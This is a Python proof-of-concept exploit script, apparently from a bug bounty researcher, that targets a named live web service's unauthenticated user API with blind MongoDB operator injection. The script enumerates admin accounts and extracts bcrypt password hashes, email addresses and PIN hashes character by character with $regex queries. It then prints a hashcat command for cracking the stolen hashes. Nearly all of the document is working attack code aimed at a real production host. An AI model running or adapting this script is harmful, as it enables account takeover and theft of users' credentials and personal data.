#!/usr/bin/env python3
"""
PoC: Blind NoSQLi Password Hash & Email Extraction
Target: app.pouch.ph
Endpoint: GET /api/v0/user (NO AUTHENTICATION REQUIRED)

Vulnerability: MongoDB operator injection via Express qs parser.
The endpoint accepts query parameters as MongoDB operators ($regex, $gt, $ne, $exists)
without any authentication or input sanitization.

This script extracts:
1. All admin usernames via role=admin filter
2. Full bcrypt password hash via blind $regex
3. Email address via blind $regex

Usage:
  python3 poc_nosqli_hash_extract.py --enumerate-admins
  python3 poc_nosqli_hash_extract.py --extract-hash admin
  python3 poc_nosqli_hash_extract.py --extract-email admin
  python3 poc_nosqli_hash_extract.py --extract-hash admin --extract-email admin

Author: Kakashi (Dave Lester Mondina) - Authorized Bug Bounty Research
"""
import requests
import argparse
import time
import sys

BASE_URL = "https://app.pouch.ph/api/v0/user"
BCRYPT_CHARSET = "$./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
EMAIL_CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789.@_+-"
REGEX_SPECIAL = set("$.*+?^{}[]|()\\/")
DELAY = 0.4


def regex_escape(s):
    return "".join("\\" + c if c in REGEX_SPECIAL else c for c in s)


def check_match(params):
    try:
        r = requests.get(BASE_URL, params=params, timeout=20)
        data = r.json()
        return data.get("user") is not None
    except requests.exceptions.Timeout:
        time.sleep(2)
        return None
    except Exception as e:
        print(f"  [!] Error: {e}")
        time.sleep(2)
        return None


def enumerate_admins():
    print("[*] Enumerating admin accounts via NoSQLi role=admin filter...")
    print("[*] No authentication required.\n")
    admins = []
    last = ""
    while True:
        params = {"username[$gt]": last, "role": "admin"}
        try:
            r = requests.get(BASE_URL, params=params, timeout=15)
            data = r.json()
            user = data.get("user")
            if user is None:
                break
            admins.append(user)
            last = user["username"]
            print(f"  [+] {user['username']:30s} _id: {user['_id']}")
            time.sleep(DELAY)
        except Exception as e:
            print(f"  [!] Error: {e}")
            time.sleep(2)
            continue
    print(f"\n[*] Total admin accounts found: {len(admins)}")
    return admins


def extract_field(username, field, charset, max_len=60):
    print(f"[*] Extracting {field} for user: {username}")
    print(f"[*] No authentication required.\n")

    if not check_match({"username": username, f"{field}[$exists]": "true"}):
        print(f"  [-] Field '{field}' does not exist for user '{username}'")
        return ""

    known = ""
    for pos in range(max_len):
        found = False
        for c in charset:
            prefix = regex_escape(known)
            escaped_c = "\\" + c if c in REGEX_SPECIAL else c
            regex = "^" + prefix + escaped_c

            result = check_match({"username": username, f"{field}[$regex]": regex})
            if result is True:
                known += c
                sys.stdout.write(f"\r  [+] [{pos+1:2d}] {known}")
                sys.stdout.flush()
                found = True
                time.sleep(DELAY)
                break
            elif result is None:
                found_retry = check_match({"username": username, f"{field}[$regex]": regex})
                if found_retry:
                    known += c
                    sys.stdout.write(f"\r  [+] [{pos+1:2d}] {known}")
                    sys.stdout.flush()
                    found = True
                    time.sleep(DELAY)
                    break

        if not found:
            print(f"\n\n[*] Extraction complete at position {pos+1}")
            break

    print(f"\n[*] Result: {known}")
    print(f"[*] Length: {len(known)}")
    return known


def main():
    parser = argparse.ArgumentParser(description="PoC: Blind NoSQLi Hash/Email Extraction on app.pouch.ph")
    parser.add_argument("--enumerate-admins", action="store_true", help="Enumerate all admin accounts")
    parser.add_argument("--extract-hash", metavar="USERNAME", help="Extract bcrypt password hash for username")
    parser.add_argument("--extract-email", metavar="USERNAME", help="Extract email address for username")
    parser.add_argument("--extract-pin", metavar="USERNAME", help="Extract PIN hash for username")
    args = parser.parse_args()

    if not any([args.enumerate_admins, args.extract_hash, args.extract_email, args.extract_pin]):
        parser.print_help()
        return

    print("=" * 70)
    print("PoC: Blind NoSQLi on /api/v0/user - NO AUTHENTICATION REQUIRED")
    print("Target: app.pouch.ph")
    print("=" * 70)
    print()

    if args.enumerate_admins:
        enumerate_admins()
        print()

    if args.extract_hash:
        h = extract_field(args.extract_hash, "password", BCRYPT_CHARSET, 60)
        if h:
            print(f"\n  Bcrypt hash: {h}")
            print(f"  Crack with: hashcat -m 3200 -a 0 hash.txt wordlist.txt")
        print()

    if args.extract_email:
        extract_field(args.extract_email, "email", EMAIL_CHARSET, 50)
        print()

    if args.extract_pin:
        extract_field(args.extract_pin, "pin", BCRYPT_CHARSET, 60)
        print()


if __name__ == "__main__":
    main()
